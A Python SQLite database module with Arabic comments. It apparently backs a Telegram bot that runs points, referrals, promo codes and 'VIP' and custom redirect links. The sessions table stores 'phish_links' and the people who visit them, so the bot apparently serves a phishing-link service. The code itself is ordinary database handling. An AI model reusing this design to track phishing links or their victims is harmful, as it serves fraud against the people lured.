#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
═══════════════════════════════════════════════════════════════════
    Database Manager - نظام إدارة قاعدة البيانات
    - SQLite لحفظ بيانات المستخدمين بشكل دائم وموثوق
    - يحل مشاكل JSON التي تسبب تعليق البوت مع الوقت
═══════════════════════════════════════════════════════════════════
"""

import sqlite3
import os
import json
from datetime import datetime
from typing import Optional, Dict, List, Any

class DatabaseManager:
    def __init__(self):
        self.db_path = 'bot_database.db'
        self.conn = None
        self.database_available = False
        try:
            self.connect()
            if self.conn:
                self.create_tables()
                self.database_available = True
        except Exception as e:
            print(f"⚠️ تحذير: قاعدة البيانات غير متاحة: {e}")
            self.database_available = False
    
    def connect(self):
        """إنشاء اتصال مع قاعدة البيانات SQLite"""
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
            print("✅ تم الاتصال بقاعدة البيانات SQLite بنجاح!")
            self.database_available = True
        except Exception as e:
            print(f"⚠️ تحذير: فشل الاتصال بقاعدة البيانات: {e}")
            self.conn = None
            self.database_available = False
    
    def get_cursor(self):
        """الحصول على cursor للتنفيذ"""
        if not self.database_available or self.conn is None:
            return None
        try:
            return self.conn.cursor()
        except:
            self.connect()
            if self.conn:
                return self.conn.cursor()
        return None
    
    def create_tables(self):
        """إنشاء جداول قاعدة البيانات"""
        cursor = self.get_cursor()
        if cursor is None:
            return
        
        # جدول المستخدمين - يحفظ كل معلومات المستخدم بشكل كامل
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id TEXT PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                points INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now')),
                updated_at TEXT DEFAULT (datetime('now')),
                referred_by TEXT,
                total_visits INTEGER DEFAULT 0,
                language_code TEXT,
                is_bot INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0,
                last_seen TEXT DEFAULT (datetime('now'))
            )
        """)
        
        # جدول الإحالات - لتتبع من أحال من
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id TEXT,
                referred_id TEXT,
                points_earned INTEGER DEFAULT 5,
                created_at TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (referrer_id) REFERENCES users(user_id) ON DELETE CASCADE,
                FOREIGN KEY (referred_id) REFERENCES users(user_id) ON DELETE CASCADE
            )
        """)
        cursor.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_unique_referral ON referrals(referrer_id, referred_id)")
        
        # جدول الروابط - لحفظ روابط المستخدمين
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                user_id TEXT PRIMARY KEY,
                created_at TEXT DEFAULT (datetime('now')),
                visits INTEGER DEFAULT 0,
                last_visit TEXT,
                phish_links TEXT,
                visitors TEXT,
                FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
            )
        """)
        
        try:
            cursor.execute("ALTER TABLE sessions ADD COLUMN phish_links TEXT")
        except:
            pass
        try:
            cursor.execute("ALTER TABLE sessions ADD COLUMN visitors TEXT")
        except:
            pass
        try:
            cursor.execute("ALTER TABLE sessions ADD COLUMN http_requests TEXT")
        except:
            pass
        try:
            cursor.execute("ALTER TABLE sessions ADD COLUMN multi_http_requests TEXT")
        except:
            pass
        
        # جدول روابط VIP
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vip_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                version INTEGER NOT NULL,
                image TEXT,
                expiry TEXT,
                is_permanent INTEGER DEFAULT 0,
                features TEXT,
                created_at TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
            )
        """)
        
        # جدول الروابط المخصصة
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS custom_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                version INTEGER NOT NULL,
                image TEXT,
                redirect_link TEXT,
                features TEXT,
                visits INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
            )
        """)
        
        # جدول أكواد الترويج
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                points INTEGER DEFAULT 0,
                max_uses INTEGER,
                usage_count INTEGER DEFAULT 0,
                created_by TEXT,
                created_at TEXT DEFAULT (datetime('now')),
                expires_at TEXT
            )
        """)
        
        # جدول استخدام أكواد الترويج
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS promo_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                code TEXT,
                user_id TEXT,
                used_at TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (code) REFERENCES promo_codes(code) ON DELETE CASCADE,
                FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
            )
        """)
        cursor.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_unique_usage ON promo_usage(code, user_id)")
        
        # جدول القنوات الإجبارية
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS forced_channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT,
                channel_username TEXT,
                channel_name TEXT,
                added_at TEXT DEFAULT (datetime('now'))
            )
        """)
        
        # جدول الأدمن المساعدين
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS assistant_admins (
                user_id TEXT PRIMARY KEY,
                added_at TEXT DEFAULT (datetime('now')),
                added_by TEXT
            )
        """)
        
        # جدول الطلبات HTTP - لحفظ الطلبات الناجحة
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS http_requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT NOT NULL,
                request_id TEXT UNIQUE NOT NULL,
                raw_request TEXT NOT NULL,
                method TEXT NOT NULL,
                url TEXT NOT NULL,
                headers TEXT NOT NULL,
                request_body TEXT,
                successful_origin TEXT,
                successful_referer TEXT,
                status_code INTEGER,
                response_preview TEXT,
                created_at TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
            )
        """)
        
        # Indexes لتحسين الأداء
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_created_at ON users(created_at)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_referrals_referrer ON referrals(referrer_id)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_referrals_referred ON referrals(referred_id)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_http_requests_user ON http_requests(user_id)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_http_requests_request_id ON http_requests(request_id)")
        
        self.conn.commit()
        cursor.close()
        print("✅ تم إنشاء جداول قاعدة البيانات بنجاح!")
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال المستخدمين - User Functions
    # ═══════════════════════════════════════════════════════════════
    
    def get_user(self, user_id: str) -> Optional[Dict]:
        """الحصول على بيانات مستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return None
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = cursor.fetchone()
        cursor.close()
        return dict(user) if user else None
    
    def create_user(self, user_id: str, username: str = None, first_name: str = None, 
                   last_name: str = None, referred_by: str = None, language_code: str = None,
                   is_bot: bool = False, is_premium: bool = False) -> Dict:
        """إنشاء مستخدم جديد مع كل معلوماته"""
        cursor = self.get_cursor()
        if cursor is None:
            return {}
        
        # نقاط البداية
        initial_points = 2
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        cursor.execute("""
            INSERT INTO users (user_id, username, first_name, last_name, points, 
                             referred_by, language_code, is_bot, is_premium, created_at, updated_at, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                username = excluded.username,
                first_name = excluded.first_name,
                last_name = excluded.last_name,
                language_code = excluded.language_code,
                is_premium = excluded.is_premium,
                updated_at = datetime('now'),
                last_seen = datetime('now')
        """, (user_id, username, first_name, last_name, initial_points, 
              referred_by, language_code, 1 if is_bot else 0, 1 if is_premium else 0, now, now, now))
        
        self.conn.commit()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = cursor.fetchone()
        cursor.close()
        return dict(user) if user else {}
    
    def update_user(self, user_id: str, **kwargs) -> bool:
        """تحديث بيانات مستخدم"""
        if not kwargs:
            return False
        
        cursor = self.get_cursor()
        if cursor is None:
            return False
        
        # إضافة updated_at تلقائياً
        kwargs['updated_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        kwargs['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        set_clause = ', '.join([f"{k} = ?" for k in kwargs.keys()])
        values = list(kwargs.values())
        values.append(user_id)
        
        cursor.execute(f"""
            UPDATE users SET {set_clause}
            WHERE user_id = ?
        """, tuple(values))
        
        self.conn.commit()
        cursor.close()
        return True
    
    def search_users(self, query: str) -> List[Dict]:
        """البحث عن مستخدمين بالاسم أو username"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        
        search_pattern = f"%{query}%"
        cursor.execute("""
            SELECT * FROM users 
            WHERE username LIKE ? 
               OR first_name LIKE ? 
               OR last_name LIKE ?
               OR user_id = ?
            LIMIT 50
        """, (search_pattern, search_pattern, search_pattern, query))
        
        users = cursor.fetchall()
        cursor.close()
        return [dict(u) for u in users]
    
    def get_all_users(self) -> List[Dict]:
        """الحصول على جميع المستخدمين"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("SELECT * FROM users ORDER BY created_at DESC")
        users = cursor.fetchall()
        cursor.close()
        return [dict(u) for u in users]
    
    def update_user_last_seen(self, user_id: str):
        """تحديث آخر ظهور للمستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return
        cursor.execute("""
            UPDATE users SET last_seen = ? WHERE user_id = ?
        """, (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), user_id))
        self.conn.commit()
        cursor.close()
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال النقاط - Points Functions
    # ═══════════════════════════════════════════════════════════════
    
    def add_points(self, user_id: str, points: int) -> bool:
        """إضافة نقاط لمستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        cursor.execute("""
            UPDATE users SET points = points + ?, updated_at = datetime('now')
            WHERE user_id = ?
        """, (points, user_id))
        self.conn.commit()
        cursor.close()
        return True
    
    def set_points(self, user_id: str, points: int) -> bool:
        """تعيين نقاط مستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        cursor.execute("""
            UPDATE users SET points = ?, updated_at = datetime('now')
            WHERE user_id = ?
        """, (points, user_id))
        self.conn.commit()
        cursor.close()
        return True
    
    def get_leaderboard(self, limit: int = 10) -> List[Dict]:
        """الحصول على لوحة المتصدرين"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("""
            SELECT u.*, COUNT(r.id) as referral_count
            FROM users u
            LEFT JOIN referrals r ON u.user_id = r.referrer_id
            GROUP BY u.user_id
            ORDER BY u.points DESC, referral_count DESC
            LIMIT ?
        """, (limit,))
        users = cursor.fetchall()
        cursor.close()
        return [dict(u) for u in users]
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال الإحالات - Referral Functions
    # ═══════════════════════════════════════════════════════════════
    
    def add_referral(self, referrer_id: str, referred_id: str, points: int = 5) -> bool:
        """إضافة إحالة جديدة"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        
        try:
            # إضافة الإحالة
            cursor.execute("""
                INSERT OR IGNORE INTO referrals (referrer_id, referred_id, points_earned)
                VALUES (?, ?, ?)
            """, (referrer_id, referred_id, points))
            
            # إضافة النقاط للمحيل
            cursor.execute("""
                UPDATE users SET points = points + ?, updated_at = datetime('now')
                WHERE user_id = ?
            """, (points, referrer_id))
            
            self.conn.commit()
            cursor.close()
            return True
        except Exception as e:
            print(f"خطأ في إضافة إحالة: {e}")
            cursor.close()
            return False
    
    def get_user_referrals(self, user_id: str) -> List[Dict]:
        """الحصول على إحالات مستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("""
            SELECT r.*, u.username, u.first_name, u.last_name
            FROM referrals r
            JOIN users u ON r.referred_id = u.user_id
            WHERE r.referrer_id = ?
            ORDER BY r.created_at DESC
        """, (user_id,))
        referrals = cursor.fetchall()
        cursor.close()
        return [dict(r) for r in referrals]
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال الجلسات - Session Functions
    # ═══════════════════════════════════════════════════════════════
    
    def create_session(self, user_id: str) -> Dict:
        """إنشاء جلسة لمستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return None
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("""
            INSERT INTO sessions (user_id, created_at, visits, last_visit)
            VALUES (?, ?, 0, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                last_visit = excluded.last_visit
        """, (user_id, current_time, current_time))
        self.conn.commit()
        cursor.execute("SELECT * FROM sessions WHERE user_id = ?", (user_id,))
        session = cursor.fetchone()
        cursor.close()
        return dict(session) if session else None
    
    def increment_session_visits(self, user_id: str) -> bool:
        """زيادة عدد الزيارات"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("""
            UPDATE sessions SET 
                visits = visits + 1,
                last_visit = ?
            WHERE user_id = ?
        """, (current_time, user_id))
        self.conn.commit()
        cursor.close()
        return True
    
    def get_session(self, user_id: str) -> Optional[Dict]:
        """الحصول على جلسة مستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return None
        cursor.execute("SELECT * FROM sessions WHERE user_id = ?", (user_id,))
        session = cursor.fetchone()
        cursor.close()
        return dict(session) if session else None
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال VIP - VIP Functions
    # ═══════════════════════════════════════════════════════════════
    
    def create_vip_link(self, user_id: str, version: int, image: str = "", 
                       expiry: datetime = None, is_permanent: bool = False,
                       features: dict = None) -> Dict:
        """إنشاء رابط VIP"""
        cursor = self.get_cursor()
        if cursor is None:
            return {}
        expiry_str = expiry.strftime('%Y-%m-%d %H:%M:%S') if expiry else None
        cursor.execute("""
            INSERT INTO vip_links (user_id, version, image, expiry, is_permanent, features)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (user_id, version, image, expiry_str, 1 if is_permanent else 0, json.dumps(features or {})))
        self.conn.commit()
        link_id = cursor.lastrowid
        cursor.execute("SELECT * FROM vip_links WHERE id = ?", (link_id,))
        vip_link = cursor.fetchone()
        cursor.close()
        return dict(vip_link) if vip_link else {}
    
    def get_user_vip_links(self, user_id: str) -> List[Dict]:
        """الحصول على روابط VIP للمستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("""
            SELECT * FROM vip_links 
            WHERE user_id = ? 
            ORDER BY created_at DESC
        """, (user_id,))
        links = cursor.fetchall()
        cursor.close()
        return [dict(l) for l in links]
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال الروابط المخصصة - Custom Links Functions
    # ═══════════════════════════════════════════════════════════════
    
    def create_custom_link(self, user_id: str, version: int, image: str = "",
                          redirect_link: str = "", features: dict = None) -> Dict:
        """إنشاء رابط مخصص"""
        cursor = self.get_cursor()
        if cursor is None:
            return {}
        cursor.execute("""
            INSERT INTO custom_links (user_id, version, image, redirect_link, features)
            VALUES (?, ?, ?, ?, ?)
        """, (user_id, version, image, redirect_link, json.dumps(features or {})))
        self.conn.commit()
        link_id = cursor.lastrowid
        cursor.execute("SELECT * FROM custom_links WHERE id = ?", (link_id,))
        custom_link = cursor.fetchone()
        cursor.close()
        return dict(custom_link) if custom_link else {}
    
    def get_user_custom_links(self, user_id: str) -> List[Dict]:
        """الحصول على الروابط المخصصة للمستخدم"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("""
            SELECT * FROM custom_links 
            WHERE user_id = ? 
            ORDER BY created_at DESC
        """, (user_id,))
        links = cursor.fetchall()
        cursor.close()
        return [dict(l) for l in links]
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال أكواد الترويج - Promo Code Functions
    # ═══════════════════════════════════════════════════════════════
    
    def create_promo_code(self, code: str, points: int, max_uses: int = None,
                         created_by: str = None, expires_at: datetime = None) -> Dict:
        """إنشاء كود ترويجي"""
        cursor = self.get_cursor()
        if cursor is None:
            return {}
        expires_str = expires_at.strftime('%Y-%m-%d %H:%M:%S') if expires_at else None
        cursor.execute("""
            INSERT INTO promo_codes (code, points, max_uses, created_by, expires_at)
            VALUES (?, ?, ?, ?, ?)
            ON CONFLICT(code) DO UPDATE SET
                points = excluded.points,
                max_uses = excluded.max_uses
        """, (code, points, max_uses, created_by, expires_str))
        self.conn.commit()
        cursor.execute("SELECT * FROM promo_codes WHERE code = ?", (code,))
        promo = cursor.fetchone()
        cursor.close()
        return dict(promo) if promo else {}
    
    def use_promo_code(self, code: str, user_id: str) -> tuple[bool, str]:
        """استخدام كود ترويجي"""
        cursor = self.get_cursor()
        if cursor is None:
            return False, "خطأ في الاتصال بقاعدة البيانات"
        
        # التحقق من الكود
        cursor.execute("SELECT * FROM promo_codes WHERE code = ?", (code,))
        promo = cursor.fetchone()
        
        if not promo:
            cursor.close()
            return False, "كود غير موجود"
        
        # التحقق من الصلاحية
        if promo['expires_at']:
            expires_dt = datetime.strptime(promo['expires_at'], '%Y-%m-%d %H:%M:%S')
            if datetime.now() > expires_dt:
                cursor.close()
                return False, "الكود منتهي الصلاحية"
        
        # التحقق من الاستخدامات
        if promo['max_uses'] and promo['usage_count'] >= promo['max_uses']:
            cursor.close()
            return False, "تم استخدام الكود بالحد الأقصى"
        
        # التحقق من استخدام المستخدم للكود
        cursor.execute("""
            SELECT * FROM promo_usage WHERE code = ? AND user_id = ?
        """, (code, user_id))
        
        if cursor.fetchone():
            cursor.close()
            return False, "لقد استخدمت هذا الكود من قبل"
        
        # استخدام الكود
        try:
            cursor.execute("""
                INSERT INTO promo_usage (code, user_id) VALUES (?, ?)
            """, (code, user_id))
            
            cursor.execute("""
                UPDATE promo_codes SET usage_count = usage_count + 1
                WHERE code = ?
            """, (code,))
            
            cursor.execute("""
                UPDATE users SET points = points + ?
                WHERE user_id = ?
            """, (promo['points'], user_id))
            
            self.conn.commit()
            cursor.close()
            return True, f"تم إضافة {promo['points']} نقطة"
        except Exception as e:
            cursor.close()
            return False, f"خطأ: {e}"
    
    def get_all_promo_codes(self) -> List[Dict]:
        """الحصول على جميع أكواد الترويج"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("SELECT * FROM promo_codes ORDER BY created_at DESC")
        promos = cursor.fetchall()
        cursor.close()
        return [dict(p) for p in promos]
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال القنوات الإجبارية - Forced Channels Functions
    # ═══════════════════════════════════════════════════════════════
    
    def add_forced_channel(self, channel_id: str, channel_username: str, 
                          channel_name: str) -> Dict:
        """إضافة قناة إجبارية"""
        cursor = self.get_cursor()
        if cursor is None:
            return {}
        cursor.execute("""
            INSERT INTO forced_channels (channel_id, channel_username, channel_name)
            VALUES (?, ?, ?)
        """, (channel_id, channel_username, channel_name))
        self.conn.commit()
        channel_rowid = cursor.lastrowid
        cursor.execute("SELECT * FROM forced_channels WHERE id = ?", (channel_rowid,))
        channel = cursor.fetchone()
        cursor.close()
        return dict(channel) if channel else {}
    
    def get_forced_channels(self) -> List[Dict]:
        """الحصول على القنوات الإجبارية"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("SELECT * FROM forced_channels ORDER BY added_at")
        channels = cursor.fetchall()
        cursor.close()
        return [dict(c) for c in channels]
    
    def remove_forced_channel(self, channel_id: str) -> bool:
        """حذف قناة إجبارية"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        cursor.execute("DELETE FROM forced_channels WHERE id = ?", (channel_id,))
        self.conn.commit()
        cursor.close()
        return True
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال الأدمن المساعدين - Assistant Admins Functions
    # ═══════════════════════════════════════════════════════════════
    
    def add_assistant_admin(self, user_id: str, added_by: str = None) -> bool:
        """إضافة أدمن مساعد"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        try:
            cursor.execute("""
                INSERT INTO assistant_admins (user_id, added_by)
                VALUES (?, ?)
                ON CONFLICT(user_id) DO NOTHING
            """, (user_id, added_by))
            self.conn.commit()
            cursor.close()
            return True
        except Exception as e:
            print(f"خطأ في إضافة أدمن مساعد: {e}")
            cursor.close()
            return False
    
    def get_assistant_admins(self) -> List[Dict]:
        """الحصول على قائمة الأدمن المساعدين"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        cursor.execute("SELECT * FROM assistant_admins ORDER BY added_at")
        admins = cursor.fetchall()
        cursor.close()
        return [dict(a) for a in admins]
    
    def is_assistant_admin(self, user_id: str) -> bool:
        """التحقق من كون المستخدم أدمن مساعد"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        cursor.execute("SELECT * FROM assistant_admins WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        cursor.close()
        return result is not None
    
    def remove_assistant_admin(self, user_id: str) -> bool:
        """حذف أدمن مساعد"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        cursor.execute("DELETE FROM assistant_admins WHERE user_id = ?", (user_id,))
        self.conn.commit()
        cursor.close()
        return True
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال الإحصائيات - Statistics Functions
    # ═══════════════════════════════════════════════════════════════
    
    def get_bot_statistics(self) -> Dict:
        """الحصول على إحصائيات البوت"""
        cursor = self.get_cursor()
        if cursor is None:
            return {}
        
        stats = {}
        
        # عدد المستخدمين
        cursor.execute("SELECT COUNT(*) as count FROM users")
        stats['total_users'] = cursor.fetchone()['count']
        
        # عدد المستخدمين اليوم
        cursor.execute("""
            SELECT COUNT(*) as count FROM users 
            WHERE DATE(created_at) = DATE('now')
        """)
        stats['users_today'] = cursor.fetchone()['count']
        
        # إجمالي النقاط
        cursor.execute("SELECT SUM(points) as total FROM users")
        stats['total_points'] = cursor.fetchone()['total'] or 0
        
        # عدد الإحالات
        cursor.execute("SELECT COUNT(*) as count FROM referrals")
        stats['total_referrals'] = cursor.fetchone()['count']
        
        # عدد الجلسات
        cursor.execute("SELECT COUNT(*) as count FROM sessions")
        stats['total_sessions'] = cursor.fetchone()['count']
        
        # إجمالي الزيارات
        cursor.execute("SELECT SUM(visits) as total FROM sessions")
        stats['total_visits'] = cursor.fetchone()['total'] or 0
        
        cursor.close()
        return stats
    
    # ═══════════════════════════════════════════════════════════════
    #  دوال الطلبات HTTP - HTTP Requests Functions
    # ═══════════════════════════════════════════════════════════════
    
    def save_http_request(self, user_id: str, request_id: str, raw_request: str,
                         method: str, url: str, headers: dict, request_body: str = None,
                         successful_origin: str = None, successful_referer: str = None, 
                         status_code: int = None, response_preview: str = None) -> Dict:
        """حفظ طلب HTTP ناجح"""
        cursor = self.get_cursor()
        if cursor is None:
            return {}
        
        try:
            cursor.execute("""
                INSERT INTO http_requests (user_id, request_id, raw_request, method, url, 
                                          headers, request_body, successful_origin, successful_referer, 
                                          status_code, response_preview)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (user_id, request_id, raw_request, method, url, 
                  json.dumps(headers), request_body, successful_origin, successful_referer, 
                  status_code, response_preview))
            self.conn.commit()
            
            cursor.execute("SELECT * FROM http_requests WHERE request_id = ?", (request_id,))
            request_data = cursor.fetchone()
            cursor.close()
            return dict(request_data) if request_data else {}
        except Exception as e:
            print(f"❌ خطأ في حفظ الطلب HTTP: {e}")
            cursor.close()
            return {}
    
    def get_http_request(self, request_id: str) -> Optional[Dict]:
        """استرجاع طلب HTTP بواسطة request_id"""
        cursor = self.get_cursor()
        if cursor is None:
            return None
        
        cursor.execute("SELECT * FROM http_requests WHERE request_id = ?", (request_id,))
        request_data = cursor.fetchone()
        cursor.close()
        
        if request_data:
            result = dict(request_data)
            result['headers'] = json.loads(result['headers'])
            return result
        return None
    
    def get_user_http_requests(self, user_id: str) -> List[Dict]:
        """الحصول على جميع طلبات HTTP لمستخدم معين"""
        cursor = self.get_cursor()
        if cursor is None:
            return []
        
        cursor.execute("""
            SELECT * FROM http_requests 
            WHERE user_id = ? 
            ORDER BY created_at DESC
        """, (user_id,))
        requests = cursor.fetchall()
        cursor.close()
        
        result = []
        for req in requests:
            req_dict = dict(req)
            req_dict['headers'] = json.loads(req_dict['headers'])
            result.append(req_dict)
        return result
    
    def delete_http_request(self, request_id: str) -> bool:
        """حذف طلب HTTP"""
        cursor = self.get_cursor()
        if cursor is None:
            return False
        
        cursor.execute("DELETE FROM http_requests WHERE request_id = ?", (request_id,))
        self.conn.commit()
        cursor.close()
        return True
    
    def close(self):
        """إغلاق الاتصال بقاعدة البيانات"""
        if self.conn:
            self.conn.close()
            print("✅ تم إغلاق الاتصال بقاعدة البيانات")

# إنشاء instance عالمي
db = DatabaseManager()
